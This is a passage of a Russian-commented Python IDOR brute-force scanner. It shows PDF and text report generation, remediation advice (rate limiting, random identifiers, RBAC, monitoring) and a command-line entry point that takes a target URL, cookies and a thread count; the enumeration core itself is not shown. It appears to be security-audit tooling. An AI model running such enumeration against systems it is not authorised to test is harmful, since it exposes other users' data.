                fontName=font_name,
                fontSize=10,
                leading=14
            )

            #Стиль для таблиц
            table_style = ParagraphStyle(
                'TableRussian',
                parent=styles['Normal'],
                fontName=font_name,
                fontSize=9,
                leading=12
            )

            #Содержимое документа
            story = []

            #Заголовок
            story.append(Paragraph("Отчет об аудите IDOR уязвимостей", title_style))
            story.append(Spacer(1, 20))

            #Информация о сканировании
            story.append(Paragraph("Информация о сканировании", heading_style))

            scan_date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            duration = time.time() - self.stats['start_time']

            info_data = [
                ['Параметр', 'Значение'],
                ['Цель сканирования', self.target_url],
                ['Дата сканирования', scan_date],
                ['Общее время', f"{duration:.1f} секунд"],
                ['Алфавит', f"{len(self.alphabet)} символов (a-z, A-Z, 0-9)"],
                ['Всего комбинаций', f"{self.stats['total_combinations']:,}"],
                ['Протестировано', f"{self.stats['combinations_tested']}"],
                ['Отправлено запросов', str(self.stats['requests_sent'])],
                ['Найдено уязвимостей', str(self.stats['vulnerabilities_found'])]
            ]

            #таблица с данными
            table_data = []
            for row in info_data:
                table_row = []
                for cell in row:
                    table_row.append(Paragraph(str(cell), table_style))
                table_data.append(table_row)

            info_table = Table(table_data, colWidths=[200, 300])
            info_table.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#3498DB')),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
                ('FONTNAME', (0, 0), (-1, 0), font_name if fonts_setup else 'Helvetica-Bold'),
                ('FONTSIZE', (0, 0), (-1, 0), 12),
                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                ('BACKGROUND', (0, 1), (-1, -1), colors.HexColor('#EBF5FB')),
                ('GRID', (0, 0), (-1, -1), 1, colors.HexColor('#D6EAF8'))
            ]))

            story.append(info_table)
            story.append(Spacer(1, 20))

            #Результаты сканирования
            if self.vulnerabilities:
                story.append(Paragraph("Результаты сканирования", heading_style))
                story.append(Paragraph(f"Найдено уязвимостей: {len(self.vulnerabilities)}", subheading_style))

                for i, vuln in enumerate(self.vulnerabilities, 1):
                    story.append(Paragraph(f"Уязвимость #{i}: {vuln['type']}", subheading_style))

                    vuln_data = [['Параметр', 'Значение'],
                        ['URL', vuln['url']],
                        ['Комбинация', vuln['combo']],
                        ['Тип', vuln['type']],
                        ['Код ответа', str(vuln.get('status_code', 'N/A'))],
                        ['Длина ответа', f"{vuln.get('content_length', 0)} символов"],
                        ['Уверенность', vuln.get('confidence', 'Неизвестно')],
                        ['Доказательства', vuln.get('evidence', 'Нет')],
                        ['Метод обнаружения', vuln.get('discovery_method', 'Bruteforce')],
                        ['Время обнаружения', vuln.get('timestamp', 'N/A')]]

                    #Создаем таблицу для уязвимости
                    vuln_table_data = []
                    for row in vuln_data:
                        table_row = []
                        for cell in row:
                            table_row.append(Paragraph(str(cell), table_style))
                        vuln_table_data.append(table_row)

                    vuln_table = Table(vuln_table_data, colWidths=[150, 350])

                    #Цвет в зависимости от уверенности
                    if vuln.get('confidence') == 'High':
                        header_color = colors.HexColor('#E74C3C')  #Красный
                        row_color = colors.HexColor('#FDEDEC')  #Светло-красный
                    else:
                        header_color = colors.HexColor('#F39C12')  #Оранжевый
                        row_color = colors.HexColor('#FEF5E7')  #Светло-оранжевый

                    vuln_table.setStyle(TableStyle([
                        ('BACKGROUND', (0, 0), (-1, 0), header_color),
                        ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                        ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
                        ('FONTNAME', (0, 0), (-1, 0), font_name if fonts_setup else 'Helvetica-Bold'),
                        ('BACKGROUND', (0, 1), (-1, -1), row_color),
                        ('GRID', (0, 0), (-1, -1), 1, colors.HexColor('#E5E7E9')),
                        ('ROWBACKGROUNDS', (0, 1), (-1, -1), [colors.white, row_color])
                    ]))

                    story.append(vuln_table)
                    story.append(Spacer(1, 12))
            else:
                story.append(Paragraph("Результаты сканирования", heading_style))
                story.append(Paragraph("Уязвимости не обнаружены.", normal_style))
                story.append(Spacer(1, 12))

            # Рекомендации по безопасности
            story.append(PageBreak())
            story.append(Paragraph("Рекомендации по устранению IDOR уязвимостей", heading_style))
            story.append(Spacer(1, 12))

            story.append(Paragraph("1. ЗАЩИТА ОТ ПЕРЕБОРА (BRUTEFORCE):", subheading_style))
            recommendations = [
                "Внедрите ограничение запросов (rate limiting)",
                "Используйте CAPTCHA для подозрительных запросов",
                "Добавьте задержки между попытками доступа",
                "Блокируйте IP-адреса после множества неудачных попыток"
            ]

            for rec in recommendations:
                story.append(Paragraph(rec, normal_style))

            story.append(Spacer(1, 12))

            story.append(Paragraph("2.БЕЗОПАСНЫЕ ИДЕНТИФИКАТОРЫ:", subheading_style))
            recommendations = [
                "Используйте UUID/GUID вместо последовательных чисел",
                "Минимальная длина идентификатора 16+ случайных символов",
                "Регулярно меняйте идентификаторы сессий",
                "Не используйте предсказуемые паттерны (user1, user2)"
            ]

            for rec in recommendations:
                story.append(Paragraph(rec, normal_style))

            story.append(Spacer(1, 12))

            story.append(Paragraph("3. КОНТРОЛЬ ДОСТУПА:", subheading_style))
            recommendations = [
                "Проверяйте права доступа для КАЖДОГО запроса",
                "Внедрите систему RBAC (Role-Based Access Control)",
                "Используйте токены с ограниченным сроком действия",
                "Реализуйте проверку на уровне приложения и БД"
            ]

            for rec in recommendations:
                story.append(Paragraph(rec, normal_style))

            story.append(Spacer(1, 12))

            story.append(Paragraph("4. Аудит:", subheading_style))
            recommendations = [
                "Ведите логи всех запросов к защищенным ресурсам",
                "Настройте оповещения о подозрительной активности",
                "Регулярно проводите тестирование на проникновение",
                "Используйте системы обнаружения вторжений (IDS)"
            ]

            for rec in recommendations:
                story.append(Paragraph(rec, normal_style))

            story.append(Spacer(1, 20))

            #Заключение
            story.append(Paragraph("Заключение", heading_style))
            story.append(Paragraph(
                "Данный отчет содержит результаты автоматизированного аудита безопасности "
                "на предмет уязвимостей типа IDOR (Insecure Direct Object Reference) "
                "с использованием метода bruteforce (перебора комбинаций). "
                "Найденные уязвимости требуют немедленного внимания и устранения.",
                normal_style
            ))

            story.append(Spacer(1, 20))

            #PDF отчёт
            doc.build(story)
            print(f"PDF отчет успешно создан: {filename}")

            if not fonts_setup:
                print("Внимание: Русский текст может отображаться некорректно в PDF")
                print("Для правильного отображения установите шрифты с поддержкой кириллицы")

        except Exception as e:
            print(f"Ошибка создания PDF отчета: {e}")
            import traceback
            traceback.print_exc()
            #текстовый отчет как запасной вариант
            self.generate_text_report(filename.replace('.pdf', '.txt'))

    def generate_text_report(self, filename="idor_report.txt"):
        """Генерирует текстовый отчет"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"idor_bruteforce_report_{self.base_domain}_{timestamp}.txt"

        report_lines = []


        report_lines.append("Отчет об аудите IDOR уязвимостей")
        report_lines.append(f"Цель: {self.target_url}")
        report_lines.append(f"Дата сканирования: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report_lines.append(f"Метод: Перебор 6-символьных комбинаций")
        report_lines.append(f"Алфавит: {len(self.alphabet)} символов (a-z, A-Z, 0-9)")
        report_lines.append(f"Всего возможных комбинаций: {self.stats['total_combinations']:,}")
        report_lines.append(f"Протестировано комбинаций: {self.stats['combinations_tested']}")
        report_lines.append(f"Найдено уязвимостей: {len(self.vulnerabilities)}")
        report_lines.append("")

        if self.vulnerabilities:
            report_lines.append("Найденные уязвимости IDOR")

            for i, vuln in enumerate(self.vulnerabilities, 1):
                report_lines.append(f"{i}. {vuln['type']}")
                report_lines.append(f"URL: {vuln['url']}")
                report_lines.append(f"Комбинация: {vuln['combo']}")
                report_lines.append(f"Код ответа: {vuln.get('status_code', 'N/A')}")
                report_lines.append(f"Длина ответа: {vuln.get('content_length', 'N/A')}")
                report_lines.append(f"Уверенность: {vuln.get('confidence', 'Неизвестно')}")
                report_lines.append(f"Доказательства: {vuln.get('evidence', 'Нет')}")
                report_lines.append("")
        else:
            report_lines.append("Уязвимости не найдены")
            report_lines.append("")
        report_lines.append("Статистика сканирования")
        duration = time.time() - self.stats['start_time']
        report_lines.append(f"Общее время сканирования: {duration:.2f} секунд")
        report_lines.append(f"Отправлено HTTP запросов: {self.stats['requests_sent']}")
        report_lines.append(f"Протестировано комбинаций: {self.stats['combinations_tested']}")

        if self.stats['total_combinations'] > 0:
            percentage = (self.stats['combinations_tested'] / self.stats['total_combinations']) * 100
            report_lines.append(f"Покрытие комбинаций: {percentage:.10f}%")

        report_lines.append("")
        report_lines.append("Рекомендации по устранению IDOR")
        report_lines.append("1.Защита от перебора:")
        report_lines.append("Используйте CAPTCHA для подозрительных запросов")
        report_lines.append("Добавьте задержки между попытками доступа")
        report_lines.append("Блокируйте IP-адреса после множества неудачных попыток")
        report_lines.append("")
        report_lines.append("2.Безопасные индификаторы:")
        report_lines.append("Минимальная длина идентификатора -16+ случайных символов")
        report_lines.append("Регулярно меняйте идентификаторы сессий")
        report_lines.append("Не используйте предсказуемые паттерны")
        report_lines.append("")
        report_lines.append("3.Контроль доступа:")
        report_lines.append("Проверяйте права доступа для КАЖДОГО запроса")
        report_lines.append("Внедрите систему RBAC (Role-Based Access Control)")
        report_lines.append("Используйте токены с ограниченным сроком действия")
        report_lines.append("")
        report_lines.append("4.Мониторинг и аудит:")
        report_lines.append("Настройте оповещения о подозрительной активности")
        report_lines.append("Регулярно проводите тестирование на проникновение")
        report_lines.append("Используйте системы обнаружения вторжений")
        report_lines.append("")
        report_lines.append("Конец отчета")


        with open(filename, 'w', encoding='utf-8') as f:
            f.write('\n'.join(report_lines))

        print(f"\nТекстовый отчет сохранен в файл: {filename}")
        print("Краткие результаты:")
        if self.vulnerabilities:
            print(f"Найдено {len(self.vulnerabilities)} уязвимостей IDOR:")
            for i, vuln in enumerate(self.vulnerabilities[:5], 1):
                print(f"{i}. {vuln['url']}")
        else:
            print("Уязвимости не обнаружены")

    def generate_report(self, output_file=None):
        """Генерирует отчет в обоих форматах"""
        if not output_file:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            base_name = f"idor_report_{self.base_domain}_{timestamp}"
        else:
            base_name = output_file.replace('.pdf', '').replace('.txt', '')
        pdf_filename = f"{base_name}.pdf"
        self.generate_pdf_report(pdf_filename)
        txt_filename = f"{base_name}.txt"
        self.generate_text_report(txt_filename)

        return pdf_filename, txt_filename


def main():
    """Основная функция для запуска сканера"""
    parser = argparse.ArgumentParser(
        description='IDOR Bruteforce Scanner - Перебор 6-символьных комбинаций',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Всего комбинаций: 62^6 = 56.8 миллиардов
  Полный перебор слишком долгий
  Используйте стратегии тестирования""")

    parser.add_argument('url', help='Целевой URL для сканирования')
    parser.add_argument('--threads', type=int, default=20,
                        help='Максимальное количество потоков (по умолчанию: 20)')
    parser.add_argument('--cookies', type=str,
                        help='Cookies в формате "name1=value1; name2=value2"')
    parser.add_argument('--headers', type=str,
                        help='Заголовки в формате JSON')
    parser.add_argument('--output', type=str,
                        help='Имя файла для отчета (без расширения)')

    args = parser.parse_args()
    cookies_dict = {}
    if args.cookies:
        for cookie in args.cookies.split(';'):
            if '=' in cookie:
                name, value = cookie.strip().split('=', 1)
                cookies_dict[name] = value
    headers_dict = {}
    if args.headers:
        try:
            headers_dict = json.loads(args.headers)
        except json.JSONDecodeError:
            print("Ошибка парсинга заголовков. Убедитесь, что это валидный JSON.")
            return
    scanner = SimpleIDORBruteforceScanner(
        target_url=args.url,
        max_threads=args.threads,
        cookies=cookies_dict,
        headers=headers_dict
    )

    try:

        vulnerabilities = scanner.scan()
        pdf_file, txt_file = scanner.generate_report(args.output)
        print(f"PDF отчет: {pdf_file}")
        print(f"Текстовый отчет: {txt_file}")

    except KeyboardInterrupt:
        print("\n\nСканирование прервано пользователем")
        scanner.generate_report(args.output)
    except Exception as e:
        print(f"\nКритическая ошибка: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()
